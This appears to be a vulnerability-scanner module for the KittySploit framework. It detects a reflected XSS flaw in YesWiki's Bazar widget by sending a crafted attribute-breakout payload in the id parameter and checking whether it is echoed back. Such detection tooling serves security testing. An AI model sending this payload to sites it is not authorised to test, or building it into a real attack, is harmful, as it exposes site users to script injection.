#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""YesWiki's Bazar widget handler reflects the id GET parameter into HTML attributes using strip_tags() only."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': "YesWiki Bazar Widget - Reflected XSS via 'id' Parameter Detection",
        'description': "YesWiki's Bazar widget handler reflects the id GET parameter into HTML attributes using strip_tags() only. strip_tags() does not escape double quotes, allowing an attacker to break out of the data-formid attribute and inject arbitrary event handlers.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'yeswiki', 'xss', 'reflected'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/YesWiki/yeswiki/security/advisories/GHSA-r5xw-gcgw-hwp5',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-52774',
        ],
        'cve': 'CVE-2026-52774',
    }

    def run(self):
        path = '/NoSuchPage/widget?id=%22%20onmouseover=%22alert(document.domain)%22%20x=%22'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_any = ('yeswiki', 'YesWiki',)
        body_all = ('data-formid="" onmouseover="alert(document.domain)" x=""', 'widgetapp',)
        ctype_any = ('text/html',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason="YesWiki Bazar Widget - Reflected XSS via 'id' Parameter detected",
                path=path,
            )
            return True
        return False

